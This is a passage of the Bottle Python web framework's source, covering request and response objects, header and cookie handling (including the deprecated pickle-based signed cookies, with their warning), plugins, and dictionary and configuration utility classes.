self.environ.get('HTTP_X_FORWARDED_FOR')\n        if proxy: return [ip.strip() for ip in proxy.split(',')]\n        remote = self.environ.get('REMOTE_ADDR')\n        return [remote] if remote else []\n\n    @property\n    def remote_addr(self):\n        \"\"\" The client IP as a string. Note that this information can be forged\n            by malicious clients. \"\"\"\n        route = self.remote_route\n        return route[0] if route else None\n\n    def copy(self):\n        \"\"\" Return a new :class:`Request` with a shallow :attr:`environ` copy. \"\"\"\n        return Request(self.environ.copy())\n\n    def get(self, value, default=None):\n        return self.environ.get(value, default)\n\n    def __getitem__(self, key):\n        return self.environ[key]\n\n    def __delitem__(self, key):\n        self[key] = \"\"\n        del (self.environ[key])\n\n    def __iter__(self):\n        return iter(self.environ)\n\n    def __len__(self):\n        return len(self.environ)\n\n    def keys(self):\n        return self.environ.keys()\n\n    def __setitem__(self, key, value):\n        \"\"\" Change an environ value and clear all caches that depend on it. \"\"\"\n\n        if self.environ.get('bottle.request.readonly'):\n            raise KeyError('The environ dictionary is read-only.')\n\n        self.environ[key] = value\n        todelete = ()\n\n        if key == 'wsgi.input':\n            todelete = ('body', 'forms', 'files', 'params', 'post', 'json')\n        elif key == 'QUERY_STRING':\n            todelete = ('query', 'params')\n        elif key.startswith('HTTP_'):\n            todelete = ('headers', 'cookies')\n\n        for key in todelete:\n            self.environ.pop('bottle.request.' + key, None)\n\n    def __repr__(self):\n        return '<%s: %s %s>' % (self.__class__.__name__, self.method, self.url)\n\n    def __getattr__(self, name):\n        \"\"\" Search in self.environ for additional user defined attributes. \"\"\"\n        try:\n            var = self.environ['bottle.request.ext.%s' % name]\n            return var.__get__(self) if hasattr(var, '__get__') else var\n        except KeyError:\n            raise AttributeError('Attribute %r not defined.' % name)\n\n    def __setattr__(self, name, value):\n        if name == 'environ': return object.__setattr__(self, name, value)\n        key = 'bottle.request.ext.%s' % name\n        if hasattr(self, name):\n            raise AttributeError(\"Attribute already defined: %s\" % name)\n        self.environ[key] = value\n\n    def __delattr__(self, name):\n        try:\n            del self.environ['bottle.request.ext.%s' % name]\n        except KeyError:\n            raise AttributeError(\"Attribute not defined: %s\" % name)\n\n\ndef _hkey(key):\n    if '\\n' in key or '\\r' in key or '\\0' in key:\n        raise ValueError(\"Header names must not contain control characters: %r\" % key)\n    return key.title().replace('_', '-')\n\n\ndef _hval(value):\n    value = tonat(value)\n    if '\\n' in value or '\\r' in value or '\\0' in value:\n        raise ValueError(\"Header value must not contain control characters: %r\" % value)\n    return value\n\n\nclass HeaderProperty(object):\n    def __init__(self, name, reader=None, writer=None, default=''):\n        self.name, self.default = name, default\n        self.reader, self.writer = reader, writer\n        self.__doc__ = 'Current value of the %r header.' % name.title()\n\n    def __get__(self, obj, _):\n        if obj is None: return self\n        value = obj.get_header(self.name, self.default)\n        return self.reader(value) if self.reader else value\n\n    def __set__(self, obj, value):\n        obj[self.name] = self.writer(value) if self.writer else value\n\n    def __delete__(self, obj):\n        del obj[self.name]\n\n\nclass BaseResponse(object):\n    \"\"\" Storage class for a response body as well as headers and cookies.\n\n        This class does support dict-like case-insensitive item-access to\n        headers, but is NOT a dict. Most notably, iterating over a response\n        yields parts of the body and not the headers.\n\n        :param body: The response body as one of the supported types.\n        :param status: Either an HTTP status code (e.g. 200) or a status line\n                       including the reason phrase (e.g. '200 OK').\n        :param headers: A dictionary or a list of name-value pairs.\n\n        Additional keyword arguments are added to the list of headers.\n        Underscores in the header name are replaced with dashes.\n    \"\"\"\n\n    default_status = 200\n    default_content_type = 'text/html; charset=UTF-8'\n\n    # Header denylist for specific response codes\n    # (rfc2616 section 10.2.3 and 10.3.5)\n    bad_headers = {\n        204: frozenset(('Content-Type', 'Content-Length')),\n        304: frozenset(('Allow', 'Content-Encoding', 'Content-Language',\n                  'Content-Length', 'Content-Range', 'Content-Type',\n                  'Content-Md5', 'Last-Modified'))\n    }\n\n    def __init__(self, body='', status=None, headers=None, **more_headers):\n        self._cookies = None\n        self._headers = {}\n        self.body = body\n        self.status = status or self.default_status\n        if headers:\n            if isinstance(headers, dict):\n                headers = headers.items()\n            for name, value in headers:\n                self.add_header(name, value)\n        if more_headers:\n            for name, value in more_headers.items():\n                self.add_header(name, value)\n\n    def copy(self, cls=None):\n        \"\"\" Returns a copy of self. \"\"\"\n        cls = cls or BaseResponse\n        assert issubclass(cls, BaseResponse)\n        copy = cls()\n        copy.status = self.status\n        copy._headers = dict((k, v[:]) for (k, v) in self._headers.items())\n        if self._cookies:\n            cookies = copy._cookies = SimpleCookie()\n            for k,v in self._cookies.items():\n                cookies[k] = v.value\n                cookies[k].update(v) # also copy cookie attributes\n        return copy\n\n    def __iter__(self):\n        return iter(self.body)\n\n    def close(self):\n        if hasattr(self.body, 'close'):\n            self.body.close()\n\n    @property\n    def status_line(self):\n        \"\"\" The HTTP status line as a string (e.g. ``404 Not Found``).\"\"\"\n        return self._status_line\n\n    @property\n    def status_code(self):\n        \"\"\" The HTTP status code as an integer (e.g. 404).\"\"\"\n        return self._status_code\n\n    def _set_status(self, status):\n        if isinstance(status, int):\n            code, status = status, _HTTP_STATUS_LINES.get(status)\n        elif ' ' in status:\n            if '\\n' in status or '\\r' in status or '\\0' in status:\n                raise ValueError('Status line must not include control chars.')\n            status = status.strip()\n            code = int(status.split()[0])\n        else:\n            raise ValueError('String status line without a reason phrase.')\n        if not 100 <= code <= 999:\n            raise ValueError('Status code out of range.')\n        self._status_code = code\n        self._status_line = str(status or ('%d Unknown' % code))\n\n    def _get_status(self):\n        return self._status_line\n\n    status = property(\n        _get_status, _set_status, None,\n        ''' A writeable property to change the HTTP response status. It accepts\n            either a numeric code (100-999) or a string with a custom reason\n            phrase (e.g. \"404 Brain not found\"). Both :data:`status_line` and\n            :data:`status_code` are updated accordingly. The return value is\n            always a status string. ''')\n    del _get_status, _set_status\n\n    @property\n    def headers(self):\n        \"\"\" An instance of :class:`HeaderDict`, a case-insensitive dict-like\n            view on the response headers. \"\"\"\n        hdict = HeaderDict()\n        hdict.dict = self._headers\n        return hdict\n\n    def __contains__(self, name):\n        return _hkey(name) in self._headers\n\n    def __delitem__(self, name):\n        del self._headers[_hkey(name)]\n\n    def __getitem__(self, name):\n        return self._headers[_hkey(name)][-1]\n\n    def __setitem__(self, name, value):\n        self._headers[_hkey(name)] = [_hval(value)]\n\n    def get_header(self, name, default=None):\n        \"\"\" Return the value of a previously defined header. If there is no\n            header with that name, return a default value. \"\"\"\n        return self._headers.get(_hkey(name), [default])[-1]\n\n    def set_header(self, name, value):\n        \"\"\" Create a new response header, replacing any previously defined\n            headers with the same name. \"\"\"\n        self._headers[_hkey(name)] = [_hval(value)]\n\n    def add_header(self, name, value):\n        \"\"\" Add an additional response header, not removing duplicates. \"\"\"\n        self._headers.setdefault(_hkey(name), []).append(_hval(value))\n\n    def iter_headers(self):\n        \"\"\" Yield (header, value) tuples, skipping headers that are not\n            allowed with the current response status code. \"\"\"\n        return self.headerlist\n\n    def _wsgi_status_line(self):\n        \"\"\" WSGI conform status line (latin1-encodeable) \"\"\"\n        if py3k:\n            return self._status_line.encode('utf8').decode('latin1')\n        return self._status_line\n\n    @property\n    def headerlist(self):\n        \"\"\" WSGI conform list of (header, value) tuples. \"\"\"\n        out = []\n        headers = list(self._headers.items())\n        if 'Content-Type' not in self._headers:\n            headers.append(('Content-Type', [self.default_content_type]))\n        if self._status_code in self.bad_headers:\n            bad_headers = self.bad_headers[self._status_code]\n            headers = [h for h in headers if h[0] not in bad_headers]\n        out += [(name, val) for (name, vals) in headers for val in vals]\n        if self._cookies:\n            for c in self._cookies.values():\n                out.append(('Set-Cookie', _hval(c.OutputString())))\n        if py3k:\n            out = [(k, v.encode('utf8').decode('latin1')) for (k, v) in out]\n        return out\n\n    content_type = HeaderProperty('Content-Type')\n    content_length = HeaderProperty('Content-Length', reader=int, default=-1)\n    expires = HeaderProperty(\n        'Expires',\n        reader=lambda x: datetime.utcfromtimestamp(parse_date(x)),\n        writer=lambda x: http_date(x))\n\n    @property\n    def charset(self, default='UTF-8'):\n        \"\"\" Return the charset specified in the content-type header (default: utf8). \"\"\"\n        if 'charset=' in self.content_type:\n            return self.content_type.split('charset=')[-1].split(';')[0].strip()\n        return default\n\n    def set_cookie(self, name, value, secret=None, digestmod=hashlib.sha256, **options):\n        \"\"\" Create a new cookie or replace an old one. If the `secret` parameter is\n            set, create a `Signed Cookie` (described below).\n\n            :param name: the name of the cookie.\n            :param value: the value of the cookie.\n            :param secret: a signature key required for signed cookies.\n\n            Additionally, this method accepts all RFC 2109 attributes that are\n            supported by :class:`cookie.Morsel`, including:\n\n            :param maxage: maximum age in seconds. (default: None)\n            :param expires: a datetime object or UNIX timestamp. (default: None)\n            :param domain: the domain that is allowed to read the cookie.\n              (default: current domain)\n            :param path: limits the cookie to a given path (default: current path)\n            :param secure: limit the cookie to HTTPS connections (default: off).\n            :param httponly: prevents client-side javascript to read this cookie\n              (default: off, requires Python 2.6 or newer).\n            :param samesite: Control or disable third-party use for this cookie.\n              Possible values: `lax`, `strict` or `none` (default).\n\n            If neither `expires` nor `maxage` is set (default), the cookie will\n            expire at the end of the browser session (as soon as the browser\n            window is closed).\n\n            Signed cookies may store any pickle-able object and are\n            cryptographically signed to prevent manipulation. Keep in mind that\n            cookies are limited to 4kb in most browsers.\n\n            Warning: Pickle is a potentially dangerous format. If an attacker\n            gains access to the secret key, he could forge cookies that execute\n            code on server side if unpickled. Using pickle is discouraged and\n            support for it will be removed in later versions of bottle.\n\n            Warning: Signed cookies are not encrypted (the client can still see\n            the content) and not copy-protected (the client can restore an old\n            cookie). The main intention is to make pickling and unpickling\n            save, not to store secret information at client side.\n        \"\"\"\n        if not self._cookies:\n            self._cookies = SimpleCookie()\n\n        # Monkey-patch Cookie lib to support 'SameSite' parameter\n        # https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1\n        if py < (3, 8, 0):\n            Morsel._reserved.setdefault('samesite', 'SameSite')\n\n        if secret:\n            if not isinstance(value, basestring):\n                depr(0, 13, \"Pickling of arbitrary objects into cookies is \"\n                            \"deprecated.\", \"Only store strings in cookies. \"\n                            \"JSON strings are fine, too.\")\n            encoded = base64.b64encode(pickle.dumps([name, value], -1))\n            sig = base64.b64encode(hmac.new(tob(secret), encoded,\n                                            digestmod=digestmod).digest())\n            value = touni(tob('!') + sig + tob('?') + encoded)\n        elif not isinstance(value, basestring):\n            raise TypeError('Secret key required for non-string cookies.')\n\n        # Cookie size plus options must not exceed 4kb.\n        if len(name) + len(value) > 3800:\n            raise ValueError('Content does not fit into a cookie.')\n\n        self._cookies[name] = value\n\n        for key, value in options.items():\n            if key in ('max_age', 'maxage'): # 'maxage' variant added in 0.13\n                key = 'max-age'\n                if isinstance(value, timedelta):\n                    value = value.seconds + value.days * 24 * 3600\n            if key == 'expires':\n                value = http_date(value)\n            if key in ('same_site', 'samesite'): # 'samesite' variant added in 0.13\n                key, value = 'samesite', (value or \"none\").lower()\n                if value not in ('lax', 'strict', 'none'):\n                    raise CookieError(\"Invalid value for SameSite\")\n            if key in ('secure', 'httponly') and not value:\n                continue\n            self._cookies[name][key] = value\n\n    def delete_cookie(self, key, **kwargs):\n        \"\"\" Delete a cookie. Be sure to use the same `domain` and `path`\n            settings as used to create the cookie. \"\"\"\n        kwargs['max_age'] = -1\n        kwargs['expires'] = 0\n        self.set_cookie(key, '', **kwargs)\n\n    def __repr__(self):\n        out = ''\n        for name, value in self.headerlist:\n            out += '%s: %s\\n' % (name.title(), value.strip())\n        return out\n\n\ndef _local_property():\n    ls = threading.local()\n\n    def fget(_):\n        try:\n            return ls.var\n        except AttributeError:\n            raise RuntimeError(\"Request context not initialized.\")\n\n    def fset(_, value):\n        ls.var = value\n\n    def fdel(_):\n        del ls.var\n\n    return property(fget, fset, fdel, 'Thread-local property')\n\n\nclass LocalRequest(BaseRequest):\n    \"\"\" A thread-local subclass of :class:`BaseRequest` with a different\n        set of attributes for each thread. There is usually only one global\n        instance of this class (:data:`request`). If accessed during a\n        request/response cycle, this instance always refers to the *current*\n        request (even on a multithreaded server). \"\"\"\n    bind = BaseRequest.__init__\n    environ = _local_property()\n\n\nclass LocalResponse(BaseResponse):\n    \"\"\" A thread-local subclass of :class:`BaseResponse` with a different\n        set of attributes for each thread. There is usually only one global\n        instance of this class (:data:`response`). Its attributes are used\n        to build the HTTP response at the end of the request/response cycle.\n    \"\"\"\n    bind = BaseResponse.__init__\n    _status_line = _local_property()\n    _status_code = _local_property()\n    _cookies = _local_property()\n    _headers = _local_property()\n    body = _local_property()\n\n\nRequest = BaseRequest\nResponse = BaseResponse\n\n\nclass HTTPResponse(Response, BottleException):\n    def __init__(self, body='', status=None, headers=None, **more_headers):\n        super(HTTPResponse, self).__init__(body, status, headers, **more_headers)\n\n    def apply(self, other):\n        other._status_code = self._status_code\n        other._status_line = self._status_line\n        other._headers = self._headers\n        other._cookies = self._cookies\n        other.body = self.body\n\n\nclass HTTPError(HTTPResponse):\n    default_status = 500\n\n    def __init__(self,\n                 status=None,\n                 body=None,\n                 exception=None,\n                 traceback=None, **more_headers):\n        self.exception = exception\n        self.traceback = traceback\n        super(HTTPError, self).__init__(body, status, **more_headers)\n\n###############################################################################\n# Plugins ######################################################################\n###############################################################################\n\n\nclass PluginError(BottleException):\n    pass\n\n\nclass JSONPlugin(object):\n    name = 'json'\n    api = 2\n\n    def __init__(self, json_dumps=json_dumps):\n        self.json_dumps = json_dumps\n\n    def setup(self, app):\n        app.config._define('json.enable', default=True, validate=bool,\n                          help=\"Enable or disable automatic dict->json filter.\")\n        app.config._define('json.ascii', default=False, validate=bool,\n                          help=\"Use only 7-bit ASCII characters in output.\")\n        app.config._define('json.indent', default=True, validate=bool,\n                          help=\"Add whitespace to make json more readable.\")\n        app.config._define('json.dump_func', default=None,\n                          help=\"If defined, use this function to transform\"\n                               \" dict into json. The other options no longer\"\n                               \" apply.\")\n\n    def apply(self, callback, route):\n        dumps = self.json_dumps\n        if not self.json_dumps: return callback\n\n        @functools.wraps(callback)\n        def wrapper(*a, **ka):\n            try:\n                rv = callback(*a, **ka)\n            except HTTPResponse as resp:\n                rv = resp\n\n            if isinstance(rv, dict):\n                #Attempt to serialize, raises exception on failure\n                json_response = dumps(rv)\n                #Set content type only if serialization successful\n                response.content_type = 'application/json'\n                return json_response\n            elif isinstance(rv, HTTPResponse) and isinstance(rv.body, dict):\n                rv.body = dumps(rv.body)\n                rv.content_type = 'application/json'\n            return rv\n\n        return wrapper\n\n\nclass TemplatePlugin(object):\n    \"\"\" This plugin applies the :func:`view` decorator to all routes with a\n        `template` config parameter. If the parameter is a tuple, the second\n        element must be a dict with additional options (e.g. `template_engine`)\n        or default variables for the template. \"\"\"\n    name = 'template'\n    api = 2\n\n    def setup(self, app):\n        app.tpl = self\n\n    def apply(self, callback, route):\n        conf = route.config.get('template')\n        if isinstance(conf, (tuple, list)) and len(conf) == 2:\n            return view(conf[0], **conf[1])(callback)\n        elif isinstance(conf, str):\n            return view(conf)(callback)\n        else:\n            return callback\n\n\n#: Not a plugin, but part of the plugin API. TODO: Find a better place.\nclass _ImportRedirect(object):\n    def __init__(self, name, impmask):\n        \"\"\" Create a virtual package that redirects imports (see PEP 302). \"\"\"\n        self.name = name\n        self.impmask = impmask\n        self.module = sys.modules.setdefault(name, new_module(name))\n        self.module.__dict__.update({\n            '__file__': __file__,\n            '__path__': [],\n            '__all__': [],\n            '__loader__': self\n        })\n        sys.meta_path.append(self)\n\n    def find_spec(self, fullname, path, target=None):\n        if '.' not in fullname: return\n        if fullname.rsplit('.', 1)[0] != self.name: return\n        from importlib.util import spec_from_loader\n        return spec_from_loader(fullname, self)\n\n    def find_module(self, fullname, path=None):\n        if '.' not in fullname: return\n        if fullname.rsplit('.', 1)[0] != self.name: return\n        return self\n\n    def load_module(self, fullname):\n        if fullname in sys.modules: return sys.modules[fullname]\n        modname = fullname.rsplit('.', 1)[1]\n        realname = self.impmask % modname\n        __import__(realname)\n        module = sys.modules[fullname] = sys.modules[realname]\n        setattr(self.module, modname, module)\n        module.__loader__ = self\n        return module\n\n###############################################################################\n# Common Utilities #############################################################\n###############################################################################\n\n\nclass MultiDict(DictMixin):\n    \"\"\" This dict stores multiple values per key, but behaves exactly like a\n        normal dict in that it returns only the newest value for any given key.\n        There are special methods available to access the full list of values.\n    \"\"\"\n\n    def __init__(self, *a, **k):\n        self.dict = dict((k, [v]) for (k, v) in dict(*a, **k).items())\n\n    def __len__(self):\n        return len(self.dict)\n\n    def __iter__(self):\n        return iter(self.dict)\n\n    def __contains__(self, key):\n        return key in self.dict\n\n    def __delitem__(self, key):\n        del self.dict[key]\n\n    def __getitem__(self, key):\n        return self.dict[key][-1]\n\n    def __setitem__(self, key, value):\n        self.append(key, value)\n\n    def keys(self):\n        return self.dict.keys()\n\n    if py3k:\n\n        def values(self):\n            return (v[-1] for v in self.dict.values())\n\n        def items(self):\n            return ((k, v[-1]) for k, v in self.dict.items())\n\n        def allitems(self):\n            return ((k, v) for k, vl in self.dict.items() for v in vl)\n\n        iterkeys = keys\n        itervalues = values\n        iteritems = items\n        iterallitems = allitems\n\n    else:\n\n        def values(self):\n            return [v[-1] for v in self.dict.values()]\n\n        def items(self):\n            return [(k, v[-1]) for k, v in self.dict.items()]\n\n        def iterkeys(self):\n            return self.dict.iterkeys()\n\n        def itervalues(self):\n            return (v[-1] for v in self.dict.itervalues())\n\n        def iteritems(self):\n            return ((k, v[-1]) for k, v in self.dict.iteritems())\n\n        def iterallitems(self):\n            return ((k, v) for k, vl in self.dict.iteritems() for v in vl)\n\n        def allitems(self):\n            return [(k, v) for k, vl in self.dict.iteritems() for v in vl]\n\n    def get(self, key, default=None, index=-1, type=None):\n        \"\"\" Return the most recent value for a key.\n\n            :param default: The default value to be returned if the key is not\n                   present or the type conversion fails.\n            :param index: An index for the list of available values.\n            :param type: If defined, this callable is used to cast the value\n                    into a specific type. Exception are suppressed and result in\n                    the default value to be returned.\n        \"\"\"\n        try:\n            val = self.dict[key][index]\n            return type(val) if type else val\n        except Exception:\n            pass\n        return default\n\n    def append(self, key, value):\n        \"\"\" Add a new value to the list of values for this key. \"\"\"\n        self.dict.setdefault(key, []).append(value)\n\n    def replace(self, key, value):\n        \"\"\" Replace the list of values with a single value. \"\"\"\n        self.dict[key] = [value]\n\n    def getall(self, key):\n        \"\"\" Return a (possibly empty) list of values for a key. \"\"\"\n        return self.dict.get(key) or []\n\n    #: Aliases for WTForms to mimic other multi-dict APIs (Django)\n    getone = get\n    getlist = getall\n\n\nclass FormsDict(MultiDict):\n    \"\"\" This :class:`MultiDict` subclass is used to store request form data.\n        Additionally to the normal dict-like item access methods (which return\n        unmodified data as native strings), this container also supports\n        attribute-like access to its values. Attributes are automatically de-\n        or recoded to match :attr:`input_encoding` (default: 'utf8'). Missing\n        attributes default to an empty string. \"\"\"\n\n    #: Encoding used for attribute values.\n    input_encoding = 'utf8'\n    #: If true (default), unicode strings are first encoded with `latin1`\n    #: and then decoded to match :attr:`input_encoding`.\n    recode_unicode = True\n\n    def _fix(self, s, encoding=None):\n        if isinstance(s, unicode) and self.recode_unicode:  # Python 3 WSGI\n            return s.encode('latin1').decode(encoding or self.input_encoding)\n        elif isinstance(s, bytes):  # Python 2 WSGI\n            return s.decode(encoding or self.input_encoding)\n        else:\n            return s\n\n    def decode(self, encoding=None):\n        \"\"\" Returns a copy with all keys and values de- or recoded to match\n            :attr:`input_encoding`. Some libraries (e.g. WTForms) want a\n            unicode dictionary. \"\"\"\n        copy = FormsDict()\n        enc = copy.input_encoding = encoding or self.input_encoding\n        copy.recode_unicode = False\n        for key, value in self.allitems():\n            copy.append(self._fix(key, enc), self._fix(value, enc))\n        return copy\n\n    def getunicode(self, name, default=None, encoding=None):\n        \"\"\" Return the value as a unicode string, or the default. \"\"\"\n        try:\n            return self._fix(self[name], encoding)\n        except (UnicodeError, KeyError):\n            return default\n\n    def __getattr__(self, name, default=unicode()):\n        # Without this guard, pickle generates a cryptic TypeError:\n        if name.startswith('__') and name.endswith('__'):\n            return super(FormsDict, self).__getattr__(name)\n        return self.getunicode(name, default=default)\n\nclass HeaderDict(MultiDict):\n    \"\"\" A case-insensitive version of :class:`MultiDict` that defaults to\n        replace the old value instead of appending it. \"\"\"\n\n    def __init__(self, *a, **ka):\n        self.dict = {}\n        if a or ka: self.update(*a, **ka)\n\n    def __contains__(self, key):\n        return _hkey(key) in self.dict\n\n    def __delitem__(self, key):\n        del self.dict[_hkey(key)]\n\n    def __getitem__(self, key):\n        return self.dict[_hkey(key)][-1]\n\n    def __setitem__(self, key, value):\n        self.dict[_hkey(key)] = [_hval(value)]\n\n    def append(self, key, value):\n        self.dict.setdefault(_hkey(key), []).append(_hval(value))\n\n    def replace(self, key, value):\n        self.dict[_hkey(key)] = [_hval(value)]\n\n    def getall(self, key):\n        return self.dict.get(_hkey(key)) or []\n\n    def get(self, key, default=None, index=-1):\n        return MultiDict.get(self, _hkey(key), default, index)\n\n    def filter(self, names):\n        for name in (_hkey(n) for n in names):\n            if name in self.dict:\n                del self.dict[name]\n\n\nclass WSGIHeaderDict(DictMixin):\n    \"\"\" This dict-like class wraps a WSGI environ dict and provides convenient\n        access to HTTP_* fields. Keys and values are native strings\n        (2.x bytes or 3.x unicode) and keys are case-insensitive. If the WSGI\n        environment contains non-native string values, these are de- or encoded\n        using a lossless 'latin1' character set.\n\n        The API will remain stable even on changes to the relevant PEPs.\n        Currently PEP 333, 444 and 3333 are supported. (PEP 444 is the only one\n        that uses non-native strings.)\n    \"\"\"\n    #: List of keys that do not have a ``HTTP_`` prefix.\n    cgikeys = ('CONTENT_TYPE', 'CONTENT_LENGTH')\n\n    def __init__(self, environ):\n        self.environ = environ\n\n    def _ekey(self, key):\n        \"\"\" Translate header field name to CGI/WSGI environ key. \"\"\"\n        key = key.replace('-', '_').upper()\n        if key in self.cgikeys:\n            return key\n        return 'HTTP_' + key\n\n    def raw(self, key, default=None):\n        \"\"\" Return the header value as is (may be bytes or unicode). \"\"\"\n        return self.environ.get(self._ekey(key), default)\n\n    def __getitem__(self, key):\n        val = self.environ[self._ekey(key)]\n        if py3k:\n            if isinstance(val, unicode):\n                val = val.encode('latin1').decode('utf8')\n            else:\n                val = val.decode('utf8')\n        return val\n\n    def __setitem__(self, key, value):\n        raise TypeError(\"%s is read-only.\" % self.__class__)\n\n    def __delitem__(self, key):\n        raise TypeError(\"%s is read-only.\" % self.__class__)\n\n    def __iter__(self):\n        for key in self.environ:\n            if key[:5] == 'HTTP_':\n                yield _hkey(key[5:])\n            elif key in self.cgikeys:\n                yield _hkey(key)\n\n    def keys(self):\n        return [x for x in self]\n\n    def __len__(self):\n        return len(self.keys())\n\n    def __contains__(self, key):\n        return self._ekey(key) in self.environ\n\n_UNSET = object()\n\nclass ConfigDict(dict):\n    \"\"\" A dict-like configuration storage with additional support for\n        namespaces, validators, meta-data, overlays and more.\n\n        This dict-like class is heavily optimized for read access. All read-only\n        methods as well as item access should be as fast as the built-in dict.\n    \"\"\"\n\n    __slots__ = ('_meta', '_change_listener', '_overlays', '_virtual_keys', '_source', '__weakref__')\n\n    def __init__(self):\n        self._meta = {}\n        self._change_listener = []\n        #: Weak references of overlays that need to be kept in sync.\n        self._overlays = []\n        #: Config that is the source for this overlay.\n        self._source = None\n        #: Keys of values copied from the source (values we do not own)\n        self._virtual_keys = set()\n\n    def load_module(self, path, squash=True):\n        \"\"\"Load values from a Python module.\n\n           Example modue ``config.py``::\n\n                DEBUG = True\n                SQLITE = {\n                    \"db\": \":memory:\"\n                }\n\n\n           >>> c = ConfigDict()\n           >>> c.load_module('config')\n           {DEBUG: True, 'SQLITE.DB': 'memory'}\n           >>> c.load_module(\"config\", False)\n           {'DEBUG': True, 'SQLITE': {'DB': 'memory'}}\n\n           :param squash: If true (default), dictionary values are assumed to\n                          represent namespaces (see :meth:`load_dict`).\n        \"\"\"\n        config_obj = load(path)\n        obj = {key: getattr(config_obj, key) for key in dir(config_obj)\n               if key.isupper()}\n\n        if squash:\n            self.load_dict(obj)\n        else:\n            self.update(obj)\n        return self\n\n    def load_config(self, filename, **options):\n        \"\"\" Load values from an ``*.ini`` style config file.\n\n            A configuration file consists of sections, each led by a\n            ``[section]`` header, followed by key/value entries separated by\n            either ``=`` or ``:``. Section names and keys are case-insensitive.\n            Leading and trailing whitespace is removed from keys and values.\n            Values can be omitted, in which case the key/value delimiter may\n            also be left out. Values can also span multiple lines, as long as\n            they are indented deeper than the first line of the value. Commands\n            are prefixed by ``#`` or ``;`` and may only appear on their own on\n            an otherwise empty line.\n\n            Both section and key names may contain dots (``.``) as namespace\n            separators. The actual configuration parameter name is constructed\n            by joining section name and key name together and converting to\n            lower case.\n\n            The special sections ``bottle`` and ``ROOT`` refer to the root\n            namespace and the ``DEFAULT`` section defines default values for all\n            other sections.\n\n            With Python 3, extended string interpolation is enabled.\n\n            :param filename: The path of a config file, or a list of paths.\n            :param options: All keyword parameters are passed to the underlying\n                :class:`python:configparser.ConfigParser` constructor call.\n\n        \"\"\"\n        options.setdefault('allow_no_value', True)\n        if py3k:\n            options.setdefault('interpolation',\n                               configparser.ExtendedInterpolation())\n        conf = configparser.ConfigParser(**options)\n        conf.read(filename)\n        for section in conf.sections():\n            for key in conf.options(section):\n                value = conf.get(section, key)\n                if section not in ('bottle', 'ROOT'):\n                    key = section + '.' + key\n                self[key.lower()] = value\n        return self\n\n    def load_dict(self, source, namespace=''):\n        \"\"\" Load values from a dictionary structure. Nesting can be used to\n            represent namespaces.\n\n            >>> c = ConfigDict()\n            >>> c.load_dict({'some': {'namespace': {'key': 'value'} } })\n            {'some.namespace.key': 'value'}\n        \"\"\"\n        for key, value in source.items():\n            if isinstance(key, basestring):\n                nskey = (namespace + '.' + key).strip('.')\n                if isinstance(value, dict):\n                    self.load_dict(value, namespace=nskey)\n                else:\n                    self[nskey] = value\n            else:\n                raise TypeError('Key has type %r (not a string)' % type(key))\n        return self\n\n    def update(self, *a, **ka):\n        \"\"\" If the first parameter is a string, all keys are prefixed with this\n            namespace. Apart from that it works just as the usual dict.update().\n\n            >>> c = ConfigDict()\n            >>> c.update('some.namespace', key='value')\n        \"\"\"\n        prefix = ''\n        if a and isinstance(a[0], basestring):\n            prefix = a[0].strip('.') + '.'\n            a = a[1:]\n        for key, value in dict(*a, **ka).items():\n            self[prefix + key] = value\n\n    def setdefault(self, key, value):\n        if key not in self:\n            self[key] = value\n        return self[key]\n\n    def __setitem__(self, key, value):\n        if not isinstance(key, basestring):\n            raise TypeError('Key has type %r (not a string)' % type(key))\n\n        self._virtual_keys.discard(key)\n\n        value = self.meta_get(key, 'filter', lambda x: x)(value)\n        if key in self and self[key] is value:\n            return\n\n        self._on_change(key, value)\n        dict.__setitem__(self, key, value)\n\n        for overlay in self._iter_overlays():\n            overlay._set_virtual(key, value)\n\n    def __delitem__(self, key):\n        if key not in self:\n            raise KeyError(key)\n        if key in self._virtual_keys:\n            raise KeyError(\"Virtual keys cannot be deleted: %s\" % key)\n\n        if self._source and key in self._source:\n            # Not virtual, but present in source -> Restore virtual value\n            dict.__delitem__(self, key)\n            self._set_virtual(key, self._source[key])\n        else:  # not virtual, not present in source. This is OUR value\n            self._on_change(key, None)\n            dict.__delitem__(self, key)\n            for overlay in self._iter_overlays():\n                overlay._delete_virtual(key)\n\n    def _set_virtual(self, key, value):\n        \"\"\" Recursively set or update virtual keys. Do nothing if non-virtual\n            value is present. \"\"\"\n        if key in self and key not in self._virtual_keys:\n            return  # Do nothing for non-virtual keys.\n\n        self._virtual_keys.add(key)\n        if key in self and self[key] is not value:\n            self._on_change(key, value)\n        dict.__setitem__(self, key, value)\n        for overlay in self._iter_overlays():\n            overlay._set_virtual(key, value)\n\n    def _delete_virtual(self, key):\n        \"\"\" Recursively delete virtual entry. Do nothing if key is not virtual.\n        \"\"\"\n        if key not in self._virtual_keys:\n            return  # Do nothing for non-virtual keys.\n\n        if key in self:\n            self._on_change(key, None)\n        dict.__delitem__(self, key)\n        self._virtual_keys.discard(key)\n        for overlay in self._iter_overlays():\n            overlay._delete_virtual(key)\n\n    def _on_change(self, key, value):\n        for cb in self._change_listener:\n            if cb(self, key, value):\n                return True\n\n    def _add_change_listener(self, func):\n        self._change_listener.append(func)\n        return func\n\n    def meta_get(self, key, metafield, default=None):\n        \"\"\" Return the value of a meta field for a key. \"\"\"\n        return self._meta.get(key, {}).get(metafield, default)\n\n    def meta_set(self, key, metafield, value):\n        \"\"\" Set the meta field for a key to a new value. \"\"\"\n        self._meta.setdefault(key, {})[metafield] = value\n\n    def meta_list(self, key):\n        \"\"\" Return an iterable of meta field names defined for a key. \"\"\"\n        return self._meta.get(key, {}).keys()\n\n    def _define(self, key, default=_UNSET, help=_UNSET, validate=_UNSET):\n        \"\"\" (Unstable) Shortcut for plugins to define own config parameters. \"\"\"\n        if default is not _UNSET:\n            self.setdefault(key, default)\n        if help is not _UNSET:\n            self.meta_set(key, 'help', help)\n        if validate is not _UNSET:\n            self.meta_set(key, 'validate', validate)\n\n    def _iter_overlays(self):\n        for ref in self._overlays:\n            overlay = ref()\n            if overlay is not None:\n                yield overlay\n\n    def _make_overlay(self):\n        \"\"\" (Unstable) Create a new overlay that acts like a chained map: Values\n            missing in the overlay are copied from the source map. Both maps\n            share the same meta entries.\n\n            Entries that were copied from the source are called 'virtual'. You\n            can not delete virtual keys, but overwrite them, which turns them\n            into non-virtual entries. Setting keys on an overlay never affects\n            its source, but may affect any number of child overlays.\n\n            Other than collections.ChainMap or most other implementations, this\n            approach does not resolve missing keys on demand, but instead\n            actively copies all values from the source to the overlay and keeps\n            track of virtual and non-virtual keys internally. This removes any\n            lookup-overhead. Read-access is as fast as a build-in dict for both\n            virtual and non-virtual 